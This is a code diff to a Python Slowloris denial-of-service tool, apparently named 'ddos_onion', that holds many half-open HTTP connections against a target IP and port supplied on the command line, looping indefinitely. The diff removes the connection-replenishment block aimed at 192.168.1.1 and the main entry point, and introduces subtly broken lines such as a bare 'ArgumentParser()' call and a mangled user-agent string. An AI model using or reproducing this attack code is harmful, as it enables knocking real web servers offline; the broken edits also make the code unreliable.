@@ -2,9 +2,10 @@ import socket
 import ssl
 import random
 import logging
+import argparse
 
 DEFAULT_USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/5.3",
     # Add more user agents as needed
 ]
 
@@ -43,20 +44,6 @@ def slowloris_iteration(list_of_sockets):
         except socket.error:
             list_of_sockets.remove(s)
 
-    diff = 100 - len(list_of_sockets)  # Adjust the desired number of connections as needed
-
-    if diff <= 0:
-        return
-
-    logging.debug("Creating %s new sockets...", diff)
-    for _ in range(diff):
-        try:
-            s = init_socket("192.168.1.1", 80, identity)
-            list_of_sockets.append(s)
-        except socket.error as e:
-            logging.debug("Failed to create new socket: %s", e)
-            break
-
     # Sleep for a random amount of time to slow down the attack
     sleep_time = random.randint(1, 5)
     logging.debug("Sleeping for %s seconds...", sleep_time)
@@ -65,7 +52,7 @@ def slowloris_iteration(list_of_sockets):
 def ddos_onion():
     logging.basicConfig(level=logging.DEBUG)
 
-    parser = argparse.ArgumentParser()
+    parser = ArgumentParser()
     parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address")
     parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
     parser.add_argument("-c", "--connections", type=int, default=100, help="Number of initial connections")
@@ -87,6 +74,3 @@ def ddos_onion():
 
     while True:
         slowloris_iteration(list_of_sockets)
-
-if __name__ == "__main__":
-    ddos_onion()
